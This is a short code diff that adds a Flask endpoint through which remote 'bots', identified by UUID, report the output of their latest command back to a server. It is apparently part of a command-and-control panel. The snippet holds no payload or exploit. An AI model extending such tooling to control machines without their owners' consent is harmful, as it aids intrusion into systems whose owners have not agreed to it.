@@ -121,3 +121,39 @@ def push_command(uuid):
 	finally:
 
 		return { "success": success_code }
+
+
+@bots.route("/api/bot/<uuid>/command", methods=["PUT"])
+def update_output_from_command(uuid):
+
+	success_code = 0
+
+	# { "output": "lalalalalalalal" } 
+
+	requests_data = request.get_json()
+
+	bot = Bot.query.get(uuid)
+
+	if not bot:
+
+		return { "success": 0 }
+
+	# Get last command
+
+	cmd = bot.commands.order_by(Command.timestamp.desc()).first()
+
+	cmd.output = requests_data["output"]
+
+	try: 
+
+		database.session.commit()
+
+		success_code = 1
+
+	except Exception:
+
+		database.session.rollback()
+
+	finally:
+
+		return { "success": success_code }
